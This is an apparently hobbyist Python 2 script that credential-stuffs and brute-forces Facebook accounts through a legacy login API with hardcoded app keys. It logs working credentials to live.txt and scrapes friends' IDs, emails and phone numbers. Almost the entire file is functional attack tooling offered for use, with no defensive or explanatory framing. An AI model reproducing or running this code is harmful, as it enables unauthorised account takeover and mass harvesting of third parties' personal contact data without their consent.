#Free Recode tpi jangan Di Claim Bro wkwk :v
#R3XDteam :)

from optparse import OptionParser
import requests
import os
import sys
import hashlib
import json
import time
import pyfiglet
from optparse import OptionParser


if sys.platform in ["linux","linux2"]:
	R = "\033[31m"
	G = "\033[32m"
	Y = "\033[33m"
	B = "\033[0m"
	BB = "\033[1m"
else:
	R = ''
	G = ''
	Y = ''
	B = ''
	BB = ''

#Component

global token
token = open("token.log","r").read()

logo = pyfiglet.figlet_format("DevTool </>")
print(R + "Created By : Hagir$" + B)
logo =BB + logo + G +"TerMuxOps Official Group" + B + BB
use = OptionParser()
print(logo)
use.add_option("-b", dest="brute", help="-b [target_id][pass.txt] ( Brute Force )", action="store_true")
use.add_option("-m", dest="mbrute", help="-m [id.txt][password] (Multi Brute Force)", action="store_true")
use.add_option("-u", dest="user" ,help="(Facebook Username)")
use.add_option("-p", dest="pwd", help="(Facebook Password)")
use.add_option("-l", dest="login",help="-l -u [username] -p [password] <action> (Login Facebook Account)", action="store_true")
use.add_option("--friend", dest="friends",help="<Retrieve Id friend>", action="store_true")
use.add_option("--mail", dest="mails",help="<Retrieve mail friend>", action="store_true")
use.add_option("--number", dest="numbers",help="<Retrieve phone number friend>", action="store_true")

(options, args) = use.parse_args() 
#Pool(10.map())

def loop(n,files,caption):
		file = open(str(files))
		global num
		num = sum(1 for y in file)			
		print "%s ( %s / %s ) \r" %(caption,n,num),
		sys.stdout.flush(),time.sleep(0.1)
		

def numberF():
	try:
		print(G +"[*] Retrieve Friend phone number"+ B)
		s = requests.get('https://graph.facebook.com/me?access_token='+token).json()
		name = s['name']

		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		me = json.loads(r.text)
		
		for x in me['data']:
			y = requests.get("https://graph.facebook.com/"+x['id']+"?access_token="+token)
			result = json.loads(y.text)
			
			try:
				f = open("data/phone/"+name+".txt","a")
				mail = result['mobile_phone'] + "|" +result['name'] + "\n"
				f.write(mail)
				print(result['mobile_phone'] +"|"+result['name'])
			except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError,UnicodeEncodeError):
				pass

		f.close()
		file = open("data/phone/"+name+".txt")
		fr = sum(1 for x in file)
		print(BB + G + str(fr) + " Phone Number Has Retrieve" + B)




	except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError):
		print(R + "[ ! ] Error"+B)



def mailF():
	try:
		print(G +"[*] Retrieve Friend email"+ B)

		s = requests.get('https://graph.facebook.com/me?access_token='+token).json()
		name = s['name']

		r = requests.get('https://graph.facebook.com/me/friends?access_token='+ token)
		me = json.loads(r.text)
		for x in me['data']:
			y = requests.get("https://graph.facebook.com/"+x['id']+"?access_token="+ token)
			result = json.loads(y.text)
			
			try:
				f = open("data/mail/"+name+".txt","a")
				mail = result['email'] + "|" +result['name'] + "\n"
				f.write(mail)
				print(result['email'] +"|"+result['name'])
			except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError,UnicodeEncodeError):
				pass


			f.close()

		file = open("data/mail/"+name+".txt")
		fr = sum(1 for x in file)
		print(BB + G + str(fr) + " email Has Retrieve" + B)
	except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError):
		print(R + "[ ! ] Error"+B)
		


def friendF():
	try:
		print(G + "[*] Retrieve Friend ID" + B)
		s = requests.get('https://graph.facebook.com/me?access_token='+token).json()
		name = s['name']
		
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token)
		result = json.loads(r.text)

		for x in result['friends']['data']:
			y = x['id'] + "\n"
			f = open("data/friend/"+name+".txt","a")
			f.write(y)
			f.close()

		file = open("data/friend/"+name+".txt")
		fr = sum(1 for x in file)
		print(BB + G + str(fr) + " Friend Has Retrieve" + B)
	except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError):
		print(R + "[ ! ] Error"+B)


def loginF(id, pwd):
	try:
		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
		x = hashlib.new('md5')
		x.update(sig)
		data.update({'sig':x.hexdigest()})
		
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)
		
		if "access_token" in a:
			token = a['access_token']
			f = open("token.log","w")
			f.write(token)
			f.close()
			
			print(G + "[*] Login Success : "+ B +" token.log")
		else:
			print(R + "[!] Login Failed" + B)
	except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError):
			print(R + "[ ! ] Error"+B)



def brute_mbrute(id, pwd):
		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
		x = hashlib.new('md5')
		x.update(sig)
		data.update({'sig':x.hexdigest()})
		
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)
		if "access_token" in a:
			token = a['access_token']
			f = open("token.log","w")
			f.write(token)
			f.close()
		
			s = requests.get('https://graph.facebook.com/me?access_token='+token).json()
			name = s['name']
		
			r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token)
			result = json.loads(r.text)
		
	
			for x in result['friends']['data']:
				y = x['id'] + "\n"
				f = open("data/friend/"+name+".txt","a")
				f.write(y)
				f.close()
		
			text = str(id) +"|"+pwd +"\n"
			g = open("live.txt","a")
			g.write(text)
			g.close()
		
			print(BB +str(id) +" | "+pwd+ G + " [ LIVE ]" + B)
			
		if 'www.facebook.com' in a['error_msg']:
			text = str(id) +"|"+pwd +"\n"
			h = open("checkpoin.txt","a")
			h.write(text)
			h.close()
			print(BB +str(id) +" | "+pwd+ Y + " [ CP ]" + B)
			
			
def startM(pwd,user):
	try:
		a = str(user)
 		file = open(str(pwd))
 		i = 1
 		for x in file:
 			user = x.strip()
 			loop(i,pwd,"mengcrack")
 			brute_mbrute(user, a)
 			i += 1
 
 			
 	except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError, UnicodeEncodeError,ValueError) as err:
 		print(str(i)+ "[ ! ] Multi Brute Force Berhenti", err)

def startB(user,pwd):
	try:
		print(G + "[*] Brute Force Running" +B)
		a = str(user)
 		file = open(str(pwd))
 		i = 1
 		for x in file:
 			user = x.strip()		
 			brute_mbrute(a,user)
 			loop(i,pwd,"mengcrack")
 			i += 1
 		print(G + BB + "Result saved in : live.txt" + B)
 	except (KeyboardInterrupt, requests.exceptions.ConnectionError, KeyError, UnicodeEncodeError) as err:
 		print(str(i) + "[ ! ] Multi Brute Force Berhenti", err)

def main():
	if (options.login, options.friends,options.mails,options.numbers, options.brute, options.mbrute) == None:
		print(use.usage)
		exit()

	if options.brute:
		try:
			startB(args[0], args[1])
		except IOError:
			print(err)

	if options.mbrute:
		try:
			startM(args[0], args[1])
		except IOError as err:
			print(err)

	if options.login:
		loginF(options.user, options.pwd)
		if options.friends:
			friendF()
					
		if options.mails:
			mailF()

		if options.numbers:
			numberF()

main()

	
	
